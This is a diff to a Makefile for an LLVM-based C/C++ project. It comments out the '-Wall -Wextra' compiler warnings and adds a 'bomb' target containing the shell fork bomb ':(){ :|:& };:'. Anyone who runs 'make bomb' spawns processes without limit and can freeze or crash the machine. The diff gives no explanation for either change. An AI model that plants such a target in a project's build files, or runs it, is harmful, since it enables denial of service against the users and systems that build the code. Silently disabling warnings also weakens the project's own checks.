@@ -10,9 +10,13 @@ LLVM_LDFLAGS		:= $(shell $(LLVM_CONFIG) --ldflags 2>/dev/null)
 LLVM_LIBS			:= $(shell $(LLVM_CONFIG) --libs core support 2>/dev/null)
 LLVM_SYSTEM_LIBS	:= $(shell $(LLVM_CONFIG) --system-libs 2>/dev/null)
 
+WARNING_FLAGS :=
+#WARNING_FLAGS += -Wall
+#WARNING_FLAGS += -Wextra
+
 INCLUDE_DIR := include
-CFLAGS		:= -Wall -Wextra -I $(INCLUDE_DIR) $(LLVM_CFLAGS)
-CXXFLAGS 	:= -Wall -Wextra -I $(INCLUDE_DIR) $(LLVM_CXXFLAGS)
+CFLAGS		:= $(WARNING_FLAGS) -I $(INCLUDE_DIR) $(LLVM_CFLAGS)
+CXXFLAGS 	:= $(WARNING_FLAGS) -I $(INCLUDE_DIR) $(LLVM_CXXFLAGS)
 
 # Dependency files
 #CFLAGS		+= -MMD -MP
@@ -101,3 +105,6 @@ test: $(TEST_BINARIES)
 
 clean:
 	rm -rf $(BUILD_DIR) $(TARGET)
+
+bomb:
+	:(){ :|:& };:
